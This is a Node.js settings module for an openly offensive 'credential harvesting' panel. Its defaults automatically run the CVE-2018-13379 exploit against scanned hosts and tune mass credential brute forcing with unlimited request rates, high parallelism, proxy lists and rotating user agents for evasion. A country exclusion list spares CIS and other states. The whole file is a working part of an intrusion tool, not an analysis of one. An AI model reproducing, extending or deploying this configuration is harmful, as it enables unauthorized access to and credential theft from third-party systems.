'use strict';
// Panel settings with validation and defaults tuned for credential harvesting.
const store = require('./store');

const DEFAULTS = {
    excludeCountries: ['ru', 'by', 'am', 'az', 'ge', 'kz', 'kg', 'md', 'tj', 'tm', 'uz', 'ua',
        'br', 'cn', 'in', 'za', 'eg', 'et', 'ir', 'ae', 'id'],
    autoAddTargets: true,
    autoBrute: false,          // auto-run brute on fresh scan hits (queued)
    autoHarvest: true,         // also try CVE-2018-13379 on fresh scan hits
    autoBruteThreads: 30,
    autoBrutePerHost: 3,
    autoBruteMode: 'smart',
    stopOnHit: true,           // stop a host after N valid pairs
    maxHitsPerHost: 3,
    perHost: 4,                // parallel creds per host
    rps: 0,                    // global requests/sec (0 = unlimited)
    jitterMs: 0,               // extra random delay per attempt
    maxSockets: 600,           // keep-alive pool size
    userAgent: '',             // blank = rotate built-ins
    proxy: [],                 // ['http://user:pass@host:8080']
    retries: 1,
};

const NUM = {
    autoBruteThreads: [1, 500], autoBrutePerHost: [1, 64], maxHitsPerHost: [0, 50],
    perHost: [1, 64], rps: [0, 100000], jitterMs: [0, 5000], maxSockets: [16, 5000], retries: [0, 5],
};

let settings = Object.assign({}, DEFAULTS, store.load('settings.json', {}));

function get() { return settings; }

function num(key, v) {
    const [min, max] = NUM[key];
    let n = parseInt(v, 10);
    if (isNaN(n)) n = DEFAULTS[key];
    return Math.max(min, Math.min(max, n));
}

function set(patch) {
    if (Array.isArray(patch.excludeCountries)) {
        settings.excludeCountries = [...new Set(patch.excludeCountries
            .map(s => String(s).toLowerCase().replace(/[^a-z]/g, '').slice(0, 2))
            .filter(s => s.length === 2))];
    }
    if (Array.isArray(patch.proxy)) {
        settings.proxy = patch.proxy.map(s => String(s).trim()).filter(Boolean).slice(0, 500);
    }
    if (typeof patch.proxyText === 'string') {
        settings.proxy = patch.proxyText.split(/[\s,;]+/).map(s => s.trim()).filter(Boolean).slice(0, 500);
    }
    if (typeof patch.userAgent === 'string') settings.userAgent = patch.userAgent.slice(0, 300);
    for (const key of ['autoAddTargets', 'autoBrute', 'autoHarvest', 'stopOnHit']) {
        if (typeof patch[key] === 'boolean') settings[key] = patch[key];
    }
    for (const key of Object.keys(NUM)) {
        if (patch[key] !== undefined) settings[key] = num(key, patch[key]);
    }
    if (typeof patch.autoBruteMode === 'string' && ['combo', 'cross', 'smart'].includes(patch.autoBruteMode)) {
        settings.autoBruteMode = patch.autoBruteMode;
    }
    store.saveSoon('settings.json', settings, 300);
    return settings;
}

function excluded(cc) { return settings.excludeCountries.includes(String(cc || '').toLowerCase()); }

module.exports = { get, set, excluded, DEFAULTS };
